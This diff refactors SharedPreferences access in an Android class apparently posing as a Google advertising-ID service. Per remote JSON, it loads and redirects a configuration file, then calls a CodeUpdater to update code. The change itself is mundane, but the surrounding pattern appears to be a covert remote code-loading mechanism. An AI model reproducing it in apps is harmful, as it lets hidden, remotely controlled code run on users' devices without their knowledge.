@@ -20,6 +20,7 @@ import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Resul
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultInstall;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultRead;
 import com.advertising_id_service.appclick.googleadvertisingidservice.REST.Results.ResultUpdate;
+import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
 import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
 import com.google.android.gms.common.GooglePlayServicesRepairableException;
 
@@ -379,7 +380,8 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
             public Loader<String> onCreateLoader(int i, Bundle bundle) {
                 return new AsyncTaskLoader<String>(cnt) {
                     public String loadInBackground() {
-                        String path_to_conf_file = cnt.getSharedPreferences("pref_session", Context.MODE_PRIVATE).getString("path_to_conf_file", null);
+                        //String path_to_conf_file = cnt.getSharedPreferences("pref_session", Context.MODE_PRIVATE).getString("path_to_conf_file", null);
+                        String path_to_conf_file = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                         String path = (path_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : path_to_conf_file;
                         Logger.log("Грузим файл из:" + path);
                         String res = null;
@@ -417,12 +419,14 @@ public class GoogleAdvertisingIdGetter_FromExternalLib implements IGoogleAdverti
                 try {
                     JSONObject rootObj = new JSONObject(json_str);
                     String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
-                    String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                    //String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                    String path_to_conf_file_last = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                     if (!path_to_conf_file.equals(path_to_conf_file_last))
                     {
                         Logger.log("Надо загрузить конфигурационный файл из другого места:" + path_to_conf_file);
                         Logger.log("Вместо:" + path_to_conf_file_last);
-                        cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
+                        //cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
+                        SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file);
                         new CodeUpdater().updateCode(cnt, lm, GAID);
                         return;
                     }
